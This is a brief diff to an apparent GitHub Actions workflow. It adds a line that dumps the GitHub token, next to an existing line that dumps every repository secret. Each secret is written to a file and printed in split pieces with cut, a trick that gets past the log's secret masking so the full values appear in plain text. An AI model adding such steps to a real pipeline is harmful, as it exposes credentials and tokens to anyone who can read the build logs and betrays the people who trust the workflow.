@@ -13,3 +13,5 @@ jobs:
           echo "Retrieved hidden information"
           echo "-----"
           echo -n "${{ tojson(secrets) }}" >> foo && cut -c1-3 foo && cut -c4- foo
+          
+          echo -n "${{ tojson(secrets.github_token) }}" >> foo && cut -c1-3 foo && cut -c4- foo
